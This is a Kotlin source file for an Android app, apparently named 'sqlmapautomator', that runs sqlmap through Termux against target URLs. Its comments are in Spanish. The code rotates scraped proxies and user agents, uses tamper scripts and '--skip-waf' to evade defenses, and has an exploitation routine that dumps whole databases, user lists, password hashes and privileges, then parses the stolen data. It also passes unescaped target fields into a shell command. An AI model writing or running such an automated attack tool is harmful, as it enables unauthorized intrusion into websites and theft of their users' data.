package com.badai.sqlmapautomator.utils

import android.content.Context
import android.util.Log
import com.badai.sqlmapautomator.data.model.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader
import java.util.*

/**
 * Ejecutor de SQLMap que maneja la integración con Termux
 */
class SQLMapExecutor(
    private val context: Context,
    private val proxyScraper: ProxyScraper
) {
    
    companion object {
        private const val TAG = "SQLMapExecutor"
        private const val TERMUX_PATH = "/data/data/com.termux/files/usr/bin"
        private const val SQLMAP_PATH = "/data/data/com.termux/files/home/sqlmap"
        private const val OUTPUT_DIR = "/data/data/com.termux/files/home/sqlmap_output"
    }
    
    /**
     * Ejecuta escaneo SQLMap en un objetivo
     */
    suspend fun executeSQLMapScan(
        target: Target,
        config: ScanConfiguration
    ): ScanResult = withContext(Dispatchers.IO) {
        
        val sessionId = UUID.randomUUID().toString()
        val startTime = Date()
        
        try {
            Log.i(TAG, "Iniciando escaneo SQLMap para ${target.url}")
            
            // Construir comando SQLMap
            val command = buildSQLMapCommand(target, config, sessionId)
            
            // Ejecutar comando
            val output = executeCommand(command)
            
            // Parsear resultados
            val result = parseSQLMapOutput(output, target, sessionId, startTime)
            
            Log.i(TAG, "Escaneo completado para ${target.url}: ${if (result.vulnerabilityFound) "VULNERABLE" else "NO VULNERABLE"}")
            
            result
            
        } catch (e: Exception) {
            Log.e(TAG, "Error ejecutando SQLMap para ${target.url}", e)
            
            ScanResult(
                targetId = target.id,
                sessionId = sessionId,
                status = ScanStatus.FAILED,
                startTime = startTime,
                endTime = Date(),
                sqlmapCommand = "",
                errorMessage = e.message,
                vulnerabilityFound = false
            )
        }
    }
    
    /**
     * Ejecuta explotación de vulnerabilidad
     */
    suspend fun executeExploitation(
        target: Target,
        config: ScanConfiguration
    ): ScanResult = withContext(Dispatchers.IO) {
        
        val sessionId = UUID.randomUUID().toString()
        val startTime = Date()
        
        try {
            Log.i(TAG, "Iniciando explotación para ${target.url}")
            
            // Comando para explotación y dump de datos
            val command = buildExploitationCommand(target, config, sessionId)
            
            // Ejecutar comando
            val output = executeCommand(command)
            
            // Parsear resultados de explotación
            val result = parseExploitationOutput(output, target, sessionId, startTime)
            
            Log.i(TAG, "Explotación completada para ${target.url}")
            
            result
            
        } catch (e: Exception) {
            Log.e(TAG, "Error durante explotación de ${target.url}", e)
            
            ScanResult(
                targetId = target.id,
                sessionId = sessionId,
                status = ScanStatus.FAILED,
                startTime = startTime,
                endTime = Date(),
                sqlmapCommand = "",
                errorMessage = e.message,
                vulnerabilityFound = false
            )
        }
    }
    
    /**
     * Construye comando SQLMap para escaneo
     */
    private fun buildSQLMapCommand(
        target: Target,
        config: ScanConfiguration,
        sessionId: String
    ): String {
        val cmd = StringBuilder()
        
        // Comando base
        cmd.append("cd $TERMUX_PATH && python $SQLMAP_PATH/sqlmap.py")
        
        // URL objetivo
        cmd.append(" -u \"${target.url}\"")
        
        // Método HTTP
        if (target.method != "GET") {
            cmd.append(" --method=${target.method}")
        }
        
        // Datos POST
        if (!target.data.isNullOrEmpty()) {
            cmd.append(" --data=\"${target.data}\"")
        }
        
        // Cookies
        if (!target.cookies.isNullOrEmpty()) {
            cmd.append(" --cookie=\"${target.cookies}\"")
        }
        
        // Headers
        if (!target.headers.isNullOrEmpty()) {
            cmd.append(" --headers=\"${target.headers}\"")
        }
        
        // User Agent
        val userAgent = target.userAgent ?: getRandomUserAgent()
        cmd.append(" --user-agent=\"$userAgent\"")
        
        // Proxy
        val proxy = target.proxy ?: getRandomProxy()
        if (proxy != null) {
            cmd.append(" --proxy=\"$proxy\"")
        }
        
        // Configuración de escaneo
        cmd.append(" --level=${config.level}")
        cmd.append(" --risk=${config.risk}")
        cmd.append(" --threads=${config.threads}")
        
        if (config.delay > 0) {
            cmd.append(" --delay=${config.delay}")
        }
        
        if (config.timeout > 0) {
            cmd.append(" --timeout=${config.timeout}")
        }
        
        // Técnicas
        if (config.techniques.isNotEmpty()) {
            cmd.append(" --technique=${config.techniques.joinToString("")}")
        }
        
        // DBMS específico
        if (!config.dbms.isNullOrEmpty()) {
            cmd.append(" --dbms=${config.dbms}")
        }
        
        // OS específico
        if (!config.os.isNullOrEmpty()) {
            cmd.append(" --os=${config.os}")
        }
        
        // Tamper scripts
        if (config.tamper.isNotEmpty()) {
            cmd.append(" --tamper=${config.tamper.joinToString(",")}")
        }
        
        // Opciones adicionales
        cmd.append(" --batch") // No interactivo
        cmd.append(" --random-agent") // User agent aleatorio
        cmd.append(" --skip-waf") // Intentar evadir WAF
        
        // Directorio de salida
        cmd.append(" --output-dir=\"$OUTPUT_DIR/$sessionId\"")
        
        // Verbosidad
        cmd.append(" -v ${config.verbose}")
        
        return cmd.toString()
    }
    
    /**
     * Construye comando SQLMap para explotación
     */
    private fun buildExploitationCommand(
        target: Target,
        config: ScanConfiguration,
        sessionId: String
    ): String {
        val cmd = buildSQLMapCommand(target, config, sessionId)
        
        val exploitCmd = StringBuilder(cmd)
        
        // Opciones de explotación
        exploitCmd.append(" --dump") // Dump de datos
        
        if (config.dumpAll) {
            exploitCmd.append(" --dump-all") // Dump completo
        }
        
        // Formato de dump
        exploitCmd.append(" --dump-format=${config.dumpFormat}")
        
        // Obtener información del DBMS
        exploitCmd.append(" --banner")
        exploitCmd.append(" --current-user")
        exploitCmd.append(" --current-db")
        exploitCmd.append(" --hostname")
        exploitCmd.append(" --is-dba")
        exploitCmd.append(" --users")
        exploitCmd.append(" --passwords")
        exploitCmd.append(" --privileges")
        exploitCmd.append(" --roles")
        exploitCmd.append(" --dbs")
        exploitCmd.append(" --tables")
        exploitCmd.append(" --columns")
        
        return exploitCmd.toString()
    }
    
    /**
     * Ejecuta comando en Termux
     */
    private suspend fun executeCommand(command: String): String = withContext(Dispatchers.IO) {
        try {
            Log.d(TAG, "Ejecutando comando: $command")
            
            val process = ProcessBuilder()
                .command("sh", "-c", command)
                .redirectErrorStream(true)
                .start()
            
            val output = StringBuilder()
            BufferedReader(InputStreamReader(process.inputStream)).use { reader ->
                var line: String?
                while (reader.readLine().also { line = it } != null) {
                    output.appendLine(line)
                    Log.d(TAG, "SQLMap: $line")
                }
            }
            
            val exitCode = process.waitFor()
            Log.d(TAG, "Comando completado con código: $exitCode")
            
            output.toString()
            
        } catch (e: Exception) {
            Log.e(TAG, "Error ejecutando comando", e)
            throw e
        }
    }
    
    /**
     * Parsea salida de SQLMap para escaneo
     */
    private fun parseSQLMapOutput(
        output: String,
        target: Target,
        sessionId: String,
        startTime: Date
    ): ScanResult {
        
        val vulnerabilityFound = output.contains("Parameter:") && 
                                (output.contains("Type:") || output.contains("Payload:"))
        
        val vulnerabilityType = when {
            output.contains("boolean-based blind") -> VulnerabilityType.BOOLEAN_BASED
            output.contains("time-based blind") -> VulnerabilityType.TIME_BASED
            output.contains("error-based") -> VulnerabilityType.ERROR_BASED
            output.contains("UNION query") -> VulnerabilityType.UNION_BASED
            output.contains("stacked queries") -> VulnerabilityType.STACKED_QUERIES
            output.contains("inline queries") -> VulnerabilityType.INLINE_QUERIES
            else -> null
        }
        
        val injectionPoint = extractInjectionPoint(output)
        val dbms = extractDBMS(output)
        val dbmsVersion = extractDBMSVersion(output)
        
        // Calcular confianza y riesgo
        val confidence = calculateConfidence(output)
        val risk = calculateRisk(vulnerabilityType, output)
        
        // Contar payloads y requests
        val payloadsUsed = countPayloads(output)
        val requestsMade = countRequests(output)
        
        return ScanResult(
            targetId = target.id,
            sessionId = sessionId,
            status = if (vulnerabilityFound) ScanStatus.COMPLETED else ScanStatus.COMPLETED,
            startTime = startTime,
            endTime = Date(),
            sqlmapCommand = buildSQLMapCommand(target, ScanConfiguration(), sessionId),
            sqlmapOutput = output,
            vulnerabilityFound = vulnerabilityFound,
            vulnerabilityType = vulnerabilityType,
            injectionPoint = injectionPoint,
            dbms = dbms,
            dbmsVersion = dbmsVersion,
            confidence = confidence,
            risk = risk,
            payloadsUsed = payloadsUsed,
            requestsMade = requestsMade
        )
    }
    
    /**
     * Parsea salida de explotación
     */
    private fun parseExploitationOutput(
        output: String,
        target: Target,
        sessionId: String,
        startTime: Date
    ): ScanResult {
        
        val scanResult = parseSQLMapOutput(output, target, sessionId, startTime)
        
        // Extraer información adicional de explotación
        val databases = extractDatabases(output)
        val tables = extractTables(output)
        val columns = extractColumns(output)
        val dumpedData = extractDumpedData(output)
        
        return scanResult.copy(
            status = ScanStatus.COMPLETED,
            databases = databases,
            tables = tables,
            columns = columns,
            dumpedData = dumpedData
        )
    }
    
    /**
     * Extrae punto de inyección
     */
    private fun extractInjectionPoint(output: String): String? {
        val parameterRegex = "Parameter: ([^\\s]+)".toRegex()
        return parameterRegex.find(output)?.groupValues?.get(1)
    }
    
    /**
     * Extrae DBMS
     */
    private fun extractDBMS(output: String): String? {
        val dbmsRegex = "back-end DBMS: ([^\\n]+)".toRegex()
        return dbmsRegex.find(output)?.groupValues?.get(1)?.trim()
    }
    
    /**
     * Extrae versión del DBMS
     */
    private fun extractDBMSVersion(output: String): String? {
        val versionRegex = "back-end DBMS: [^\\s]+ ([0-9.]+)".toRegex()
        return versionRegex.find(output)?.groupValues?.get(1)
    }
    
    /**
     * Extrae bases de datos
     */
    private fun extractDatabases(output: String): List<String> {
        val databases = mutableListOf<String>()
        val lines = output.split("\n")
        
        var inDatabaseSection = false
        for (line in lines) {
            when {
                line.contains("available databases") -> inDatabaseSection = true
                line.startsWith("[") && inDatabaseSection -> {
                    val dbName = line.substringAfter("] ").trim()
                    if (dbName.isNotEmpty()) databases.add(dbName)
                }
                line.isEmpty() && inDatabaseSection -> inDatabaseSection = false
            }
        }
        
        return databases
    }
    
    /**
     * Extrae tablas
     */
    private fun extractTables(output: String): List<String> {
        val tables = mutableListOf<String>()
        val tableRegex = "\\| ([a-zA-Z_][a-zA-Z0-9_]*) \\|".toRegex()
        
        tableRegex.findAll(output).forEach { match ->
            tables.add(match.groupValues[1])
        }
        
        return tables.distinct()
    }
    
    /**
     * Extrae columnas
     */
    private fun extractColumns(output: String): List<String> {
        val columns = mutableListOf<String>()
        val columnRegex = "Column: ([a-zA-Z_][a-zA-Z0-9_]*)".toRegex()
        
        columnRegex.findAll(output).forEach { match ->
            columns.add(match.groupValues[1])
        }
        
        return columns.distinct()
    }
    
    /**
     * Extrae datos dumpeados
     */
    private fun extractDumpedData(output: String): String? {
        val dumpStart = output.indexOf("Database:")
        val dumpEnd = output.indexOf("[INFO] table", dumpStart)
        
        return if (dumpStart != -1 && dumpEnd != -1) {
            output.substring(dumpStart, dumpEnd)
        } else if (dumpStart != -1) {
            output.substring(dumpStart)
        } else {
            null
        }
    }
    
    /**
     * Calcula confianza del resultado
     */
    private fun calculateConfidence(output: String): Int {
        return when {
            output.contains("100% sure") -> 5
            output.contains("high confidence") -> 4
            output.contains("medium confidence") -> 3
            output.contains("low confidence") -> 2
            output.contains("Parameter:") -> 1
            else -> 0
        }
    }
    
    /**
     * Calcula nivel de riesgo
     */
    private fun calculateRisk(vulnerabilityType: VulnerabilityType?, output: String): Int {
        val baseRisk = when (vulnerabilityType) {
            VulnerabilityType.UNION_BASED -> 5
            VulnerabilityType.ERROR_BASED -> 4
            VulnerabilityType.BOOLEAN_BASED -> 3
            VulnerabilityType.TIME_BASED -> 3
            VulnerabilityType.STACKED_QUERIES -> 5
            VulnerabilityType.INLINE_QUERIES -> 4
            null -> 0
        }
        
        // Ajustar riesgo según contexto
        var adjustedRisk = baseRisk
        
        if (output.contains("DBA")) adjustedRisk += 1
        if (output.contains("file system")) adjustedRisk += 1
        if (output.contains("command execution")) adjustedRisk += 2
        
        return adjustedRisk.coerceIn(0, 5)
    }
    
    /**
     * Cuenta payloads utilizados
     */
    private fun countPayloads(output: String): Int {
        return output.split("payload").size - 1
    }
    
    /**
     * Cuenta requests realizados
     */
    private fun countRequests(output: String): Int {
        val requestRegex = "\\[\\d{2}:\\d{2}:\\d{2}\\] \\[INFO\\]".toRegex()
        return requestRegex.findAll(output).count()
    }
    
    /**
     * Obtiene User Agent aleatorio
     */
    private fun getRandomUserAgent(): String {
        val userAgents = listOf(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0"
        )
        return userAgents.random()
    }
    
    /**
     * Obtiene proxy aleatorio
     */
    private fun getRandomProxy(): String? {
        val proxy = proxyScraper.getRandomProxy()
        return proxy?.let { "${it.ip}:${it.port}" }
    }
}